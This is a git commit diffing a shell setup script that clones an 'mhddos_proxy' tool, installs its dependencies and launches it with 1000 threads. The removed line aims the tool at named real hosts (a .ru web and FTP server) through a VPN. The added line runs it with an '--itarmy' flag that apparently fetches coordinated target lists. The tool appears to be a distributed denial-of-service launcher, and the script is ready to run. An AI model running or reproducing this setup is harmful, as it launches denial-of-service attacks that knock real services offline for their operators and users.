4f10bed4b65f0cff2943b389a786a9eba396b64a
panda7718 <panda7718>
2022-07-07 13:34:22 +0000

    na

--- mhddos_proxy_setup.sh
+++ mhddos_proxy_setup.sh
@@ -7,5 +7,5 @@ rm -rf mhddos_proxy && \
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git && \
 cd mhddos_proxy && \
 $PY_BIN -m pip install -r requirements.txt && \
-$PY_BIN -m pip install uvloop
-$PY_BIN runner.py http://mosday.ru:80 tcp://mosday.ru:21 -t 1000 --vpn  >> ~/workspace/mhddos_proxy/nohup.out 2>>~/workspace/mhddos_proxy/nohup.out
+$PY_BIN -m pip install uvloop && \
+$PY_BIN runner.py --itarmy -t 1000  >> ~/workspace/mhddos_proxy/nohup.out 2>>~/workspace/mhddos_proxy/nohup.out
